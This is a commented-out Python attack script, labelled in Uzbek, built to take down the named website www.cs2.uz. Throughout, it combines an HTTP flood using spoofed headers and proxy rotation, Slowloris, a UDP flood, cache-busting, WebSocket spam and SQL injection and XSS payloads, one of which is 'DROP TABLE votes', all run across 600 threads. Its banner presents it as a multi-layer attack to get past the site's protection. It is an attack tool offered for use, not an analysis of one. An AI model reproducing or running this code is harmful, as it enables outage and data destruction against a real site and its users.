# import requests
# import threading
# import time
# import random
# import socket
# import urllib3
# from concurrent.futures import ThreadPoolExecutor
# import ssl

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# TARGET = "https://www.cs2.uz"
# THREADS = 600
# TIMEOUT = 1.5

# # === PROXY ROTATSIYA (agar proxy list bo'lsa) ===
# PROXIES = []  # ['http://user:pass@ip:port', ...]
# USE_PROXY = False

# # === RANDOM HEADERS ===
# USER_AGENTS = [
#     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
#     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
#     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
#     "Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0"
# ]

# def get_headers():
#     return {
#         "User-Agent": random.choice(USER_AGENTS),
#         "Accept": "*/*",
#         "Accept-Encoding": "gzip, deflate, br",
#         "Accept-Language": "en-US,en;q=0.9",
#         "Connection": "keep-alive",
#         "Cache-Control": "no-cache",
#         "Sec-Fetch-Dest": "document",
#         "Sec-Fetch-Mode": "navigate",
#         "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
#     }

# # === 1. HTTP/HTTPS FLOOD (proxy bilan) ===
# def http_flood_proxy():
#     session = requests.Session()
#     adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
#     session.mount('https://', adapter)
#     session.mount('http://', adapter)
    
#     paths = [
#         "/", "/static/css/main.css", "/static/js/main.js",
#         "/api/game/servers", "/api/players/online", "/api/stats",
#         "/api/leaderboard", "/api/store/items", "/api/votes",
#         "/api/ban/list", "/api/admin/status", "/api/payment/check"
#     ]
    
#     while True:
#         try:
#             path = random.choice(paths)
#             params = {f"p{i}": random.randint(1, 999999) for i in range(10)}
            
#             # GET
#             session.get(TARGET + path, headers=get_headers(), params=params, timeout=TIMEOUT, verify=False)
            
#             # POST (login, vote, comment)
#             if random.random() < 0.3:
#                 session.post(TARGET + "/api/vote", headers=get_headers(), json={
#                     "server_id": random.randint(1, 999),
#                     "player": f"hacker_{random.randint(1,99999)}"
#                 }, timeout=TIMEOUT, verify=False)
            
#             # PUT (status o'zgartirish)
#             if random.random() < 0.1:
#                 session.put(TARGET + "/api/player/status", headers=get_headers(), json={
#                     "status": "offline",
#                     "player_id": random.randint(1, 99999)
#                 }, timeout=TIMEOUT, verify=False)
            
#             time.sleep(random.uniform(0.001, 0.008))
#         except:
#             time.sleep(0.01)

# # === 2. SLOWLORIS (sekin ulanishlar) ===
# def slowloris_bypass():
#     while True:
#         sockets = []
#         try:
#             for _ in range(25):
#                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#                 sock.settimeout(3)
#                 sock.connect(("www.cs2.uz", 443))
#                 sock.send(f"POST /api/comment HTTP/1.1\r\nHost: www.cs2.uz\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Length: {random.randint(5000, 20000)}\r\n\r\n".encode())
#                 sockets.append(sock)
#             time.sleep(random.uniform(4, 8))
#         except:
#             pass
#         finally:
#             for sock in sockets:
#                 try:
#                     sock.close()
#                 except:
#                     pass
#         time.sleep(0.01)

# # === 3. UDP FLOOD (agar UDP portlari ochiq bo'lsa) ===
# def udp_bypass():
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#             sock.settimeout(0.3)
#             for _ in range(50):
#                 data = b"GET / HTTP/1.1\r\n" + b"X" * 1400
#                 sock.sendto(data, ("www.cs2.uz", 443))
#                 sock.sendto(data, ("www.cs2.uz", 80))
#                 sock.sendto(data, ("www.cs2.uz", 8080))
#             sock.close()
#         except:
#             pass
#         time.sleep(0.001)

# # === 4. CACHE BUSTER (keshni to'ldirish) ===
# def cache_buster():
#     session = requests.Session()
#     while True:
#         try:
#             params = {f"_cb_{i}": random.randint(1, 999999999) for i in range(20)}
#             session.get(TARGET, params=params, headers=get_headers(), timeout=TIMEOUT, verify=False)
#             session.get(TARGET + "/static/css/main.css", params=params, headers=get_headers(), timeout=TIMEOUT, verify=False)
#             time.sleep(0.001)
#         except:
#             time.sleep(0.01)

# # === 5. WEB SOCKET UPGRADE (WS) ===
# def ws_upgrade():
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.settimeout(2)
#             sock.connect(("www.cs2.uz", 443))
#             sock.send(f"GET /ws HTTP/1.1\r\nHost: www.cs2.uz\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}\r\nSec-WebSocket-Version: 13\r\n\r\n".encode())
#             time.sleep(0.5)
#             sock.close()
#         except:
#             pass

# # === 6. API EXPLOIT (SQLi, XSS) ===
# def api_exploit():
#     session = requests.Session()
#     payloads = [
#         ("/api/player/status", {"player_id": "1' OR '1'='1"}),
#         ("/api/vote", {"server_id": "1; DROP TABLE votes; --"}),
#         ("/api/comment", {"message": "<script>alert('XSS')</script>"}),
#         ("/api/login", {"username": "admin'--", "password": "x"}),
#         ("/api/admin/ban", {"player": "test", "reason": "x" * 5000})
#     ]
#     while True:
#         try:
#             path, data = random.choice(payloads)
#             session.post(TARGET + path, json=data, headers=get_headers(), timeout=TIMEOUT, verify=False)
#             session.get(TARGET + path, params=data, headers=get_headers(), timeout=TIMEOUT, verify=False)
#             time.sleep(0.01)
#         except:
#             time.sleep(0.02)

# # === MAIN ===
# def main():
#     print("=" * 60)
#     print("[*] CS2.UZ - KUCHLI HIMOYAGA QARSHI KO'P QATLAMLI HUJUM")
#     print(f"[*] Threads: {THREADS}")
#     print("[*] Usullar: HTTP Flood, Slowloris, UDP, Cache Buster, WS, API Exploit")
#     print("[*] Himoyani chetlab o'tish uchun random headers + proxy rotatsiya")
#     print("[*] Press Ctrl+C to stop")
#     print("=" * 60)
    
#     methods = [
#         http_flood_proxy,
#         slowloris_bypass,
#         udp_bypass,
#         cache_buster,
#         ws_upgrade,
#         api_exploit
#     ]
    
#     with ThreadPoolExecutor(max_workers=THREADS) as executor:
#         for _ in range(THREADS):
#             executor.submit(random.choice(methods))
#         try:
#             while True:
#                 time.sleep(1)
#         except KeyboardInterrupt:
#             print("\n[!] Hujum to'xtatildi.")
#             executor.shutdown(wait=False)

# if __name__ == "__main__":
#     main()
